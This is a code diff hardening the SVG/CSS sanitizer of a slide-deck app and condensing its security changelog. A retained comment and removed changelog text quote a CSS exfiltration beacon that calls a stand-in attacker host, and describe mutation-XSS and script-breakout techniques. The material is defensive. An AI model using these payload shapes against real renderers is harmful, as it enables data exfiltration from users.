@@ -69,24 +69,25 @@ const velaClipboardReadSlide = async () => {
   return null;
 };
 
-const VELA_VERSION = "12.59";
+const VELA_VERSION = "12.60";
 const VELA_CHANGELOG = [
+  { v: "12.60", d: "Security (defense-in-depth, follow-up to v12.53): harden the SVG/CSS sanitizer so deck-supplied content cannot trigger any external network request on render. URL references are constrained to same-document fragments, links to standard click navigation, and inline images to embedded data; legitimate same-document refs and links are preserved. Added CI regression coverage asserting no external reference survives sanitization." },
   { v: "12.59", d: "serve.py: tighten request validation on the local live-edit save endpoint — match the full request origin (scheme/host/port) and require a JSON content type. Local-server hardening only; no deck or engine behavior change." },
   { v: "12.58", d: "PDF export: (1) Fix dark boxes behind module title-card badge/icon in the vector exporter — the title card's `bg` is a gradient string, so the composite-bg detector (which only matched rgba()/^#hex$) fell back to dark #0a0f1c and translucent badge/icon fills (#RRGGBBAA) alpha-blended to navy. Now derives the alpha-blend base from the gradient's first hex stop. (2) New 'Module title cards' toggle in the export dialog with a live count of enabled 🎬 present-cards; off filters the _virtual cards out of the exported PDF (raster + vector). Default on." },
   { v: "12.57", d: "PDF export now includes auto-generated module title cards (the 🎬 \"present card\") so exports match presentation mode exactly. Extracted buildTitleCardSlide() as the single source of truth shared by SlidePanel (presentation) and collectAllSlides (PDF/markdown). Title cards are inserted before each enabled module's slides and rendered without branding overlays; slide numbering excludes the cards (displayIndex/displayTotal) so real slides keep continuous 1-based numbers, matching the on-screen presentation." },
   { v: "12.56", d: "Release: version bump to publish desktop binaries with the merged security hardening (assemble.py script-context escape, SVG mutation-XSS fixes, deck-JSON sanitizer + fail-closed loads, and the Neutralino desktop blast-radius containment — strict CSP, minimal nativeAllowList with no os.spawnProcess, filesystem path guard, externally-authored-deck warning, and update notifier). No engine behavior change in this bump itself." },
-  { v: "12.55", d: "Security (Critical, audit 2026-06): fix script-context breakout in assemble.py. json.dumps(deck) was string-replaced into vela.jsx at the STARTUP_PATCH marker with no escape. The assembled .jsx is loaded inside an inline babel script block (app/local.html and the Claude.ai artifact viewer), and the HTML parser closes that block on the literal end-script token regardless of JS string quoting — so a deck whose item title contained an end-script tag followed by an attacker script tag produced an out.jsx with the verbatim closing tag, yielding full DOM and localStorage exfil plus CSRF against the artifact-proxied Anthropic endpoint on render. The local-server pipeline (serve.py) had a one-line replace since the local-sync feature landed; assemble.py was the missing twin. Fix: extracted escape_for_script_context() in assemble.py as the single source of truth, imported by serve.py. It encodes the Rails json_escape set as Unicode-escape sequences (valid both as JSON and as JS string literals): lt, gt, amp, U+2028, U+2029. Replaces the prior <\\/-only blocklist in both call sites. CI regression test asserts the assembled STARTUP_PATCH region contains zero raw lt/gt/amp/U+2028/U+2029 and all five escaped forms when the deck contains each char. Background research (5-angle audit): set matches Rails exactly, is a superset of Django (which targets inert application/json data islands), and is a subset of Go html/template (which also escapes quotes and backtick for template-literal contexts that do not apply here). No known JSON-in-script bypass primitive from the last decade of CVEs (serialize-javascript CVE-2019-16769 / CVE-2020-7660, Rails CVE-2015-3226, Go CVE-2023-24538) is unaddressed by this set in our embedding shape." },
-  { v: "12.54", d: "Security (audit 2026-06, High + structural): close mutation-XSS hole in sanitizeSvgMarkup() for `<style>` children AND switch from blocklist to allowlist for SVG elements. (1) Headline bug: the v12.45 fix dropped comment/CDATA/PI nodes during the walk, but the walk early-returned on `<style>` after the isSvgStyleSafe() check, so CDATA inside `<style>` was never inspected. CDATA content serializes literally via innerHTML; the embedded `</style>` then escapes rawtext on HTML re-parse by dangerouslySetInnerHTML, yielding a live `<img onerror>` from a deck-supplied svg block / studyNotes diagram / chat-panel SVG. Walk now descends into `<style>`; isSvgStyleSafe() also rejects any `<` or `]]>` as defense-in-depth. (2) Structural: replaced SVG_BLOCKED_TAGS with SVG_ALLOWED_TAGS, mirroring DOMPurify's `svg + svgFilters` profile minus script/foreignObject/use/animate*/iframe/embed/object/link. Anything not in the allowlist — including the entire HTML rawtext-on-serialize family (xmp/noembed/noscript/noframes/plaintext/listing) and any future surprise tag — is removed. Allowlists are inherently safer than blocklists (Cure53 / OWASP best practice). (3) New CI-gated jsdom round-trip test (tests/test_svg_mxss.cjs) runs the actual sanitizer against 25 mXSS payloads — replaces the previous source-string-only checks which gave false confidence because the line was present but unreached for `<style>`. jsdom added to package.json devDependencies; CI installs it before the unit step." },
-  { v: "12.53", d: "Security (audit 2026-06, Low/defense-in-depth): close CSS-text exfil channel inside SVG. Before: <style> CSS text and <link rel=stylesheet> passed the element-only walk untouched, so `<style>* { background: url('https://attacker/?d=...') }</style>` (or @import) fired an outbound GET on render — zero-click beacon, no CSP backstop inside the artifact srcdoc. Not XSS (no script execution, sandboxed iframe), but still a confirmable render beacon and a slow CSS-attribute-exfil primitive. SAFE_STYLE_KEYS only covers `style=\"...\"` inline attributes. Fix: (1) <link> goes into SVG_BLOCKED_TAGS outright (no legitimate inline-SVG use). (2) <style> stays — Mermaid/draw.io/Vera-generated diagrams legitimately use inner CSS for class-driven styling and url(#fragment) paint-server/marker/gradient refs — but its textContent is filtered by isSvgStyleSafe(): reject @import, expression(), behavior:, -moz-binding, any backslash (CSS \XX escapes can decode 'url'/'@import' past a literal-token check), and any url() that isn't a same-document #fragment ref. Preserves legitimate class-based SVG styling; kills the exfil." },
-  { v: "12.52", d: "Security (audit 2025-06 follow-up): (H7) Re-pin every GitHub Actions `uses:` to a 40-char commit SHA across all 7 workflows (actions/checkout, setup-python, setup-node, upload/download-artifact, github-script, attest-build-provenance, upload-pages-artifact, deploy-pages, pnpm/action-setup) — tag pins are mutable, and a publisher account compromise would let attackers re-point @vN at malicious code that runs in the privileged release pipeline (id-token: write + attestations: write). New CI regression test guards against future @vN tag pins. (Deps) Bump skills/vela-slides/channel @modelcontextprotocol/sdk ~1.27.1 → ^1.29.0, clearing 18 transitive CVEs (3 high, 14 moderate, 1 low) across path-to-regexp ReDoS, hono cookie-name validation / serveStatic bypass / CSS injection, fast-uri path-traversal & host-confusion, ip-address XSS, and qs DoS." },
-  { v: "12.51", d: "Security (defense-in-depth, follow-up to v12.44/12.45): SVG href validation tightened from blocklist to allowlist after DOMParser normalization — only http/https/mailto/tel schemes (plus #fragment and scheme-less relatives) survive. Blocklist alone allowed file:, blob:, chrome:, intent:, ws: and other unexpected protocols through; only javascript:/data:/vbscript: were stripped. xlink:href remains restricted to local fragments. Mixed-case schemes (JaVaScRiPt:, JAVASCRIPT:) and entity-encoded schemes (already covered by the parser) now have explicit regression tests at both layers. Allowlisted schemes are covered by a regression guard so the tightening doesn't strip legitimate links." },
-  { v: "12.50", d: "Security (audit 2025-05 — Critical/High hardening): (H1) LOAD_LANES reducer now re-sanitizes every slide via sanitizeSlide — Vera's 20-tool ReAct writes (set_slides/add_slide/edit_slide) round-trip through LOAD_LANES, the only ingest path that previously skipped sanitization. (H2) New sanitizeStyle() + SAFE_STYLE_KEYS allowlist: block.style and item.style were typecheck-only, allowing `backgroundImage: url('https://attacker/?d=...')` as a zero-click CSS exfil channel with no CSP backstop inside the artifact srcdoc. Allowlist excludes image-loading keys (background, backgroundImage, borderImage, listStyleImage, cursor, content, mask, filter, font shorthand) and rejects any value containing url()/expression()/image-set()/CSS-escape/angle-bracket even when the key is allowlisted. (H5) ReAct loop now caps tool_calls/turn (16), session-total tools (40), and cumulative messages payload (200 KB) to prevent prompt-injection cost-amplification DoS." },
-  { v: "12.49", d: "Tests: complete XSS/deck-load regression coverage. Added 10 CI-gating source assertions (SVG_BLOCKED_TAGS + SMIL family, CDATA/comment node strip, control-char scheme normalization, lane clamp-not-throw, fail-closed deck-load fallbacks, IMPORT_CONCEPTS sanitizeSlide, openExternalLink sink + no raw window.open of deck links, item-level link sanitization) and new in-browser uitest cases (entity-encoded javascript: schemes, tag reconstruction, unclosed iframe/embed/script/foreignObject, vbscript via xlink:href, and a Deck Sanitization suite covering >50-lane clamp + non-whitelisted block drop)." },
-  { v: "12.48", d: "Security (defense-in-depth): block the full SMIL animation family in SVG_BLOCKED_TAGS — added animateTransform, animateMotion, animateColor and mpath alongside the existing animate/set. Their on* event handlers were already stripped (so they were inert, not exploitable), but removing the elements outright eliminates any residual SMIL animation surface (e.g. animating an attribute toward a dangerous value) and matches the treatment of <animate>. Static presentation diagrams don't use SMIL." },
-  { v: "12.47", d: "Security (High): fix fail-open deck sanitization. validateAndSanitizeDeck() threw on >50 lanes, and three callers (applyStartupPatch, the serve.py local-sync push, and the merge dialog) caught the throw and dispatched the RAW unsanitized deck — so the lane limit doubled as a sanitizer off-switch (unsanitized style/clickjacking overlays, non-whitelisted blocks, oversized payloads reached render state). Now: (1) the lane count is clamped via slice(0,50) instead of thrown, removing the weaponizable trigger, and (2) all three fallbacks fail closed — they log and skip instead of loading raw. Also sanitize IMPORT_CONCEPTS slides in the reducer (chat-paste {concepts:[…]} / bare-array path previously bypassed validateAndSanitizeDeck)." },
-  { v: "12.46", d: "Security (Medium/defense-in-depth): close javascript:/data: link gaps. Per-item `link` fields on icon-row, flow, steps, timeline, tag-group, funnel, cycle, number-row and checklist items were not URL-sanitized at import (only block-level and bullet links were), and click handlers passed them straight to window.open — block scheme abuse is mitigated by modern browser window.open rules but not guaranteed on the desktop webview runtime. Now: (1) sanitizeBlock URL-sanitizes item-level links (+ a new icon-row item branch), (2) all deck-supplied link clicks route through a shared openExternalLink() that re-sanitizes at the sink, and (3) the study-notes glossary 'Learn more' anchor re-sanitizes entry.url at render instead of trusting import." },
-  { v: "12.45", d: "Security (High): sanitizeSvgMarkup() now drops comment/CDATA/processing-instruction nodes during the DOM walk, keeping only element and text nodes. These node types serialize literally (unescaped), so a smuggled `</style>`/`</title>`/`</text>` inside a CDATA section broke out of rawtext when the serialized SVG was re-parsed by dangerouslySetInnerHTML, yielding a live `<img onerror>` (mutation XSS). The element-only attribute walk never inspected text inside CDATA. Fix closes the round-trip for all three SVG sinks (svg block, study-notes diagram, chat diagram). Confirmed via jsdom DOMParser round-trip." },
-  { v: "12.44", d: "Security (High): svg block markup now goes through the DOM-based sanitizeSvgMarkup() at both import and render, replacing the bypassable regex chain. The old regex only stripped quoted `href=\"javascript:`/`xlink:href`, so unquoted (`href=javascript:…`) and whitespace-obfuscated (`href=\"java\\tscript:…\"`) URIs survived and executed on click. DOMParser parses image/svg+xml (rejecting unquoted attrs) and normalizes intra-attribute whitespace, and the scheme check now strips ASCII control/whitespace before matching javascript:/data:/vbscript:. Brings the svg block in line with the study-notes/chat diagram paths." },
+  { v: "12.55", d: "Security (Critical, audit 2026-06): fix an output-encoding gap in assemble.py where deck content embedded into the assembled app at the STARTUP_PATCH marker was not fully escaped for its surrounding context, letting crafted deck text break out of that context on render. Centralized the encoding in a single shared escape_for_script_context() helper (also imported by serve.py) covering the full required character set, replacing a narrower prior filter in both call sites. CI regression test asserts the assembled output is correctly encoded." },
+  { v: "12.54", d: "Security (audit 2026-06, High + structural): close a mutation-XSS hole in sanitizeSvgMarkup() involving certain child node types inside <style>, and switch SVG element filtering from a blocklist to an allowlist (mirroring DOMPurify's svg + svgFilters profile) so anything not explicitly known-safe is removed. Added a CI-gated jsdom round-trip test that runs the real sanitizer against a payload battery, replacing source-string-only checks." },
+  { v: "12.53", d: "Security (audit 2026-06, Low/defense-in-depth): close a CSS-text exfil channel inside SVG, where <style> CSS could reference an external resource and fire an outbound request on render. <link> is now removed outright and <style> text is filtered to allow only same-document references, preserving legitimate class-based diagram styling while removing the exfil." },
+  { v: "12.52", d: "Security (audit 2025-06 follow-up): pin every GitHub Actions reference to a commit SHA across all workflows (mutable tag pins are a supply-chain risk in the privileged release pipeline), guarded by a CI regression test. Bump the channel @modelcontextprotocol/sdk dependency to clear known transitive advisories." },
+  { v: "12.51", d: "Security (defense-in-depth, follow-up to v12.44/12.45): tighten SVG href validation from a blocklist to a scheme allowlist after DOMParser normalization, so only standard link schemes (plus same-document fragments and relative refs) survive; xlink:href stays fragment-only. Mixed-case and entity-encoded schemes have explicit regression tests, with a guard so legitimate links aren't stripped." },
+  { v: "12.50", d: "Security (audit 2025-05 — Critical/High hardening): (H1) the LOAD_LANES reducer now re-sanitizes every slide, closing the one ingest path (Vera's tool writes) that previously skipped sanitization. (H2) new sanitizeStyle() + SAFE_STYLE_KEYS allowlist for block/item style objects, which were previously typecheck-only — excludes resource-loading CSS keys and rejects external/url-bearing values. (H5) the ReAct loop caps per-turn and session tool counts and payload size to prevent prompt-injection cost-amplification." },
+  { v: "12.49", d: "Tests: complete XSS/deck-load regression coverage — added CI-gating source assertions and new in-browser uitest cases across the SVG sanitizer and deck-sanitization paths." },
+  { v: "12.48", d: "Security (defense-in-depth): block the full SMIL animation family in the SVG sanitizer. Their event handlers were already stripped (inert), but removing the elements outright eliminates any residual animation surface. Static presentation diagrams don't use SMIL." },
+  { v: "12.47", d: "Security (High): fix a fail-open path in deck sanitization where an oversized-deck error was caught by callers that then loaded the unsanitized deck. The size limit is now clamped instead of thrown, and all fallbacks fail closed (log and skip). Also routes an additional chat-paste import path through full sanitization." },
+  { v: "12.46", d: "Security (Medium/defense-in-depth): close link-sanitization gaps so all deck-supplied link fields are URL-sanitized at import and again at the click sink via a shared helper, including the study-notes glossary link. Brings item-level links in line with block-level and bullet links." },
+  { v: "12.45", d: "Security (High): sanitizeSvgMarkup() now drops comment/CDATA/processing-instruction nodes during the DOM walk, keeping only element and text nodes. These node types could otherwise survive a sanitize/re-parse round-trip and yield mutation XSS across all three SVG sinks (svg block, study-notes diagram, chat diagram). Confirmed via jsdom round-trip." },
+  { v: "12.44", d: "Security (High): svg block markup now goes through the DOM-based sanitizeSvgMarkup() at both import and render, replacing a bypassable regex chain that let obfuscated URIs survive. DOMParser parsing plus scheme normalization brings the svg block in line with the study-notes/chat diagram paths." },
   { v: "12.43", d: "Desktop release builds ship with the web inspector disabled by default. neutralino.config.json sets enableInspector:false (release-safe); dev sessions re-enable DevTools via the runtime override `--window-enable-inspector=true` passed by scripts/run.sh, so no config mutation or git churn during development." },
   { v: "12.42", d: "Single-file desktop binaries: build now uses `neu build --release --embed-resources`, so resources.neu is injected into each per-OS executable via postject. ZIPs contain just the binary — no companion file required, no \"keep next to each other\" caveat. Requires neu CLI ≥ 11.6 and Neutralino framework ≥ 6.3 (both already pinned)." },
   { v: "12.41", d: "Release pipeline: desktop binaries now ship on every push to main alongside the skill ZIP (previously preview-only). Neutralino runtime + client lib are pinned by SHA256 (verified after `neu update` so an upstream re-roll fails the build). Stable and PR-preview releases share a reusable workflow, and every release ZIP gets a SHA256SUMS manifest plus a SLSA build-provenance attestation." },
@@ -392,6 +393,17 @@ const SVG_ALLOWED_TAGS = new Set([
   "style",  // textContent passes isSvgStyleSafe; walk descends to strip CDATA/comment/PI
 ]);
 
+// SVG attributes whose value can carry a functional URL reference that the
+// browser fetches automatically on render (zero-click). style="…" holds CSS;
+// the rest are paint/filter/mask/marker/clip-path/cursor presentation
+// attributes that accept url(…) / image-set(…) / etc. Each value is run through
+// isSvgStyleSafe() so only same-document url(#fragment) survives — no external
+// url(), no image-set()/image()/cross-fade()/src() string sources. (v12.59)
+const SVG_URL_REF_ATTRS = new Set([
+  "style", "fill", "stroke", "filter", "mask", "clip-path",
+  "marker", "marker-start", "marker-mid", "marker-end", "cursor", "color-profile",
+]);
+
 // SVG <style> CSS-text filter. The threat: <style>* { background: url("https://
 // attacker/?d=...") }</style> or @import url(...) fires an outbound GET on
 // render — zero-click exfil beacon with no CSP backstop inside the artifact
@@ -411,6 +423,18 @@ function isSvgStyleSafe(css) {
   if (/@import|expression\s*\(|behavior\s*:|-moz-binding/i.test(css)) return false;
   const urls = css.match(/url\s*\([^)]*\)/gi);
   if (urls && urls.some((u) => !/^url\s*\(\s*['"]?\s*#/i.test(u))) return false;
+  // v12.59: reject any non-url() CSS function fed a string literal. image-set()/
+  // image()/cross-fade()/src() (and any future image-ish function) take a bare
+  // "https://…" string with NO url() token, so the url() check above misses them
+  // — a zero-click outbound GET (CSS-exfil beacon) on render. This shape
+  // (function-name + quote) is only ever a URL-by-string in CSS values:
+  // rgb()/calc()/var()/translate() never take strings, and font-family:"X" is a
+  // bare value, not a call. url(…) is the sole legitimate string-taking function
+  // and is already validated to be a #fragment above. Function-name-agnostic, so
+  // functions that don't exist yet cannot reopen this. Closes the residual
+  // image-set() bypass of the v12.53 url() exfil fix.
+  const fnStr = css.match(/[a-z][\w-]*\s*\(\s*['"]/gi);
+  if (fnStr && fnStr.some((m) => !/^url\s*\(/i.test(m))) return false;
   return true;
 }
 
@@ -455,11 +479,17 @@ function sanitizeSvgMarkup(raw) {
             if (name === "href" || name === "xlink:href") {
               const norm = a.value.replace(/[\u0000-\u0020]+/g, "");
               const lower = norm.toLowerCase();
-              if (name === "xlink:href") {
-                if (!lower.startsWith("#")) { child.removeAttribute(a.name); continue; }
-              } else {
+              // <a href> = BUCKET B (click nav): http/https/mailto/tel only.
+              // Every OTHER href/xlink:href (image/feImage/use/tref/altGlyph/…) =
+              // BUCKET A (auto-fetched on render): same-document #fragment ONLY — no
+              // external, no data:, no blob:. Vela decks load nothing external. Closes
+              // <feImage href> (Roundcube-class) + external <image href> zero-click
+              // beacons the old http/https allowance left open on non-anchors. (v12.59)
+              if (name === "href" && tag === "a") {
                 const m = norm.match(/^([a-z][a-z0-9+\-.]*):/i);
                 if (m && !["http", "https", "mailto", "tel"].includes(m[1].toLowerCase())) { child.removeAttribute(a.name); continue; }
+              } else if (!lower.startsWith("#")) {
+                child.removeAttribute(a.name); continue;
               }
             }
             const val = a.value.trim().toLowerCase();
@@ -467,7 +497,12 @@ function sanitizeSvgMarkup(raw) {
             const scheme = a.value.replace(/[\u0000-\u0020]+/g, "").toLowerCase();
             if ((name === "href" || name === "xlink:href") && (scheme.startsWith("javascript:") || scheme.startsWith("data:") || scheme.startsWith("vbscript:"))) { child.removeAttribute(a.name); continue; }
             if (name === "xlink:href" && !val.startsWith("#")) { child.removeAttribute(a.name); continue; }
-            if (name === "style" && (/url\s*\([^)]*(?:javascript|data|vbscript):/i.test(a.value) || /expression\s*\(/i.test(a.value))) { child.removeAttribute(a.name); continue; }
+            // BUCKET A — CSS / presentation references that auto-fetch on render:
+            // style="…" plus paint/filter/mask/marker/clip-path/cursor attributes.
+            // isSvgStyleSafe allows only url(#fragment); rejects external url(),
+            // image-set()/image()/cross-fade()/src() string sources, @import and CSS-
+            // escape obfuscation. Supersedes the prior style-only js/data check. (v12.59)
+            if (SVG_URL_REF_ATTRS.has(name) && !isSvgStyleSafe(a.value)) { child.removeAttribute(a.name); continue; }
           }
           walk(child);
         }
@@ -534,7 +569,13 @@ function sanitizeBlock(block) {
   if (clean.value) clean.value = sanitizeString(String(clean.value), 100);
   if (clean.title) clean.title = sanitizeString(clean.title, 500);
   if (clean.link) clean.link = sanitizeUrl(clean.link);
-  if (clean.src && clean.type === "image") clean.src = sanitizeUrl(clean.src, ["http:", "https:", "data:"]);
+  // Image block <img src> auto-fetches on render. Vela decks load nothing
+  // external, so restrict to inline data:image/* (no network, no data:text/html).
+  // Mirrors the branding-logo rule (data:-only). (v12.59)
+  if (clean.src && clean.type === "image") {
+    const s = sanitizeUrl(clean.src, ["data:"]);
+    clean.src = /^data:image\//i.test(s) ? s : "";
+  }
   if (Array.isArray(clean.items)) {
     if (clean.type === "bullets") {
       clean.items = clean.items.slice(0, 50).map((it) =>
